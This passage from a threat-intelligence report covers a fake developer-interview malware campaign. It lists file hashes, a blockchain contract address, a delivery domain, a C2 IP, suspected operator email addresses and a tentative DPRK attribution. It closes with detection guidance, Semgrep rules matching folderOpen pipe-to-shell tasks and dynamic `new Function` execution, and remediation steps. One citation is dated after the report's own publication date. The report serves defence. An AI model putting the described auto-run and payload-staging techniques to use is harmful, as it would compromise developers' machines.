| `6e04b6337480ca0395b28c78ce9a7066ce345f4b87f7b844a0414a4dfffcf5f9` | `.env`, Softstack-Platform-MVP2; identical to Tech-Core and confirms shared BSC contract address |

Hash note: the canonical hashes above come from direct `sha256sum` verification of preserved local evidence. Earlier derived values `07b32b6c...` and `e66e91ee...` should not be used for the named preserved payload paths unless the transformed/preprocessed inputs that produced them are separately preserved and documented.

---

## Campaign Expansion and Rebrand

Post-publication investigation identified a further repository continuing the same campaign under a new identity: **Softstack-Platform-MVP2**, hosted under GitHub organization **Softstack-Hub5**.

### Softstack-Hub5 / Softstack-Platform-MVP2

The repository was last updated on 2026-02-23 (two days prior to this report). Forensic comparison confirms it is a direct rebrand of Tech-Core rather than a new implementation:

- `collection.js` SHA256: `9f8c712f...` - identical to Tech-Core
- `server.js` SHA256: `95bc7ce3...` - identical to Tech-Core
- `.env` SHA256: `6e04b633...` - identical to Tech-Core
- `NFT_CONTRACT_ADDRESS=0xE251b37Bac8D85984d96da55dc977A609716EBDc` - same BSC payload contract
- `tasks.json` points to `vscode-ipchecking[.]vercel[.]app` - same active delivery domain

The Git author identity differs from Tech-Core: `CodeBlock110 / stevejame329+1@gmail.com`. The `+1` suffix suggests a numbered variant of a base Gmail identity (`stevejame329@gmail.com`), consistent with an operator maintaining multiple accounts. A broader commit-map extraction also shows repeated actor-relevant commits from `alindaniel360 <alindaniel0802@gmail.com>` and repeated use of `brajan.intro@gmail.com` under both `LuckyKat1001` and `lucky-tech-hub` author names.

### Impersonation of SOFTSTACK GmbH

The GitHub organization name `Softstack-Hub5` impersonates **SOFTSTACK GmbH**, a legitimate German Web3 company (softstack.io, registered 2019, Flensburg, Schleswig-Holstein). The real company has no apparent connection to this repository. The `Hub5` suffix in the organization name is operationally significant: a search of GitHub confirms `Softstack-Hub4` also exists with no public repositories, supporting a hypothesis of sequential account pre-staging. Accounts may have been created in advance and activated as needed, with earlier accounts either exhausted or held in reserve.

This pattern - numbered personas, impersonation of legitimate companies, identical underlying malware, and shared delivery infrastructure - supports campaign continuity rather than isolated repository abuse. The pre-staging claim should remain an analytic inference unless GitHub creation timestamps or other platform metadata are preserved.

---

## Attribution Assessment

**Assessed confidence: Low-to-Medium**

This activity is assessed as **DPRK-linked Contagious Interview-aligned** based on tradecraft overlap, not independently confirmed actor identity. The evidence supports campaign alignment; it does not prove that the same operator controlled all infrastructure described in public reporting.

Several aspects of this campaign are consistent with documented Contagious Interview activity:

- LinkedIn-based recruitment lure targeting developers
- Fake technical assessment requiring the victim to clone and execute a code repository
- JavaScript / Node.js execution chain
- Cryptocurrency, Web3, or developer-project theming
- Cross-platform execution targeting macOS, Linux, and Windows
- Use of fake social media, email, and repository identities
- Blockchain smart-contract payload staging consistent with later EtherHiding reporting

The most important technical overlap is the use of public blockchain infrastructure as a resilient payload store. Google Threat Intelligence later reported DPRK-linked UNC5342 incorporating EtherHiding into Contagious Interview activity, including JavaScript payload retrieval from BNB Smart Chain and Ethereum smart contracts. The Tech-Core case independently observed a BSC `getMemo()` staging mechanism with a Node.js execution path. This is strong technique-level correlation, but not by itself sufficient for high-confidence attribution.

**Analytic judgment:** the activity should be described as **Contagious Interview-aligned** or **DPRK-linked tradecraft overlap** rather than as confirmed Lazarus Group activity unless additional corroborating intelligence becomes available.

**Prior reporting and references:**

- [MITRE ATT&CK - Contagious Interview / G1052](https://attack.mitre.org/groups/G1052/)
- [Google Threat Intelligence - DPRK Adopts EtherHiding](https://cloud.google.com/blog/topics/threat-intelligence/dprk-adopts-etherhiding)
- [Microsoft - Contagious Interview malware delivered through fake developer job interviews](https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/)
- [Palo Alto Unit42 - Contagious Interview](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/)
- [CISA - TraderTraitor](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-108a)


## Remediation

### Detection Engineering Opportunities

**Process behavior**

- VS Code spawning `bash`, `sh`, `cmd`, `powershell`, `curl`, or `wget` shortly after a workspace is opened.
- Shell processes spawned from a `.vscode/tasks.json` execution context.
- `node` executing scripts from `$HOME/.vscode/`, `%USERPROFILE%\.vscode\`, temporary folders, or unexpected editor-created paths.
- `node` making outbound HTTP requests to non-standard ports, especially TCP/3000.

**Network behavior**

- HTTP requests to `/api/err/error` with `exceptionId=1228` and to `/api/errorMessage` with `exceptionId=env991228`.
- DNS or HTTP activity to Vercel app domains from developer workstations, especially paths matching `/api/settings/{mac,linux,win,windows}` or `/api/settings/bootstrap*`.
- Outbound requests from Node.js processes to BSC, Polygon, Ethereum RPC endpoints, or blockchain API services immediately before dynamic JavaScript execution.

**Repository / source-code behavior**

- `.vscode/tasks.json` containing `runOptions.runOn: "folderOpen"` and pipe-to-shell commands.
- JavaScript source containing `new Function('require', <payload>)(require)`.
- Combined use of `ethers.providers.JsonRpcProvider`, contract methods such as `getMemo()`, and runtime execution sinks.

### Example Semgrep Rules

```yaml
rules:
  - id: node-dynamic-require-function-execution
    message: Dynamic JavaScript execution with injected require
    severity: ERROR
    languages: [javascript, typescript]
    patterns:
      - pattern: new Function('require', $PAYLOAD)(require)

  - id: vscode-folderopen-pipe-to-shell
    message: VS Code folderOpen task with pipe-to-shell behavior
    severity: WARNING
    languages: [json]
    patterns:
      - pattern-regex: '"runOn"\s*:\s*"folderOpen"'
      - pattern-regex: '(curl|wget).*(\||cmd|bash|sh)'

  - id: blockchain-payload-execution
    message: Smart-contract payload retrieval followed by dynamic execution
    severity: ERROR
    languages: [javascript, typescript]
    patterns:
      - pattern-either:
          - pattern: ethers.providers.JsonRpcProvider(...)
          - pattern: new ethers.providers.JsonRpcProvider(...)
      - pattern-regex: 'getMemo\s*\('
      - pattern-regex: 'new Function\s*\('
```

### If You Ran the Repository

- Isolate the affected machine from the network immediately
- Preserve forensic evidence before remediation: memory dump, system logs, shell history
- Rotate all credentials accessible from the machine: SSH keys, API tokens, cloud credentials, cryptocurrency wallet seeds, browser-stored passwords
- Audit for persistence: scheduled tasks, cron jobs, registry Run keys, Launch Agents (macOS)
- Do not rely exclusively on AV/EDR - the payload executes as JavaScript within a legitimate Node.js process and may not be flagged
- If compromise is confirmed, reimage from a known-good backup or clean OS install

### Network-Level Detection

- Block and alert on outbound connections to `163.245.194[.]216` (all ports, especially TCP/3000)
- Create IDS/IPS rules for HTTP GET requests to `/api/err/error` containing `exceptionId=1228` and `/api/errorMessage` containing `exceptionId=env991228`
- Monitor for outbound HTTP (not HTTPS) connections from Node.js processes on non-standard ports
- Flag DNS queries or HTTP connections to `*.vercel[.]app` from developer workstations where no legitimate Vercel usage is expected, particularly paths matching `/api/settings/{mac,linux,win}`

### Host-Level Hardening

- Keep VS Code Workspace Trust enabled and open unknown repositories in Restricted Mode; review automatic-task prompts carefully before allowing execution
- Review all `.vscode/tasks.json` files before opening unknown repositories - specifically tasks with `runOn: folderOpen` or pipe-to-shell commands
- Run developer assessments from unknown sources in an isolated VM or container with filtered network egress and ephemeral storage
- Audit `postinstall`, `prepare`, `preinstall`, `install`, `start`, `test`, and `build` scripts before running npm commands in unknown projects

---

*TLP:CLEAR - This report may be freely shared. Attribution assessments are tentative and based on TTP similarity, infrastructure overlap, and preserved evidence. All IOCs are provided for defensive purposes.*

*Report ID: TP-2026-001 | Published: 2026-02-24 | Author: [ThreatProphet](https://threatprophet.com)*
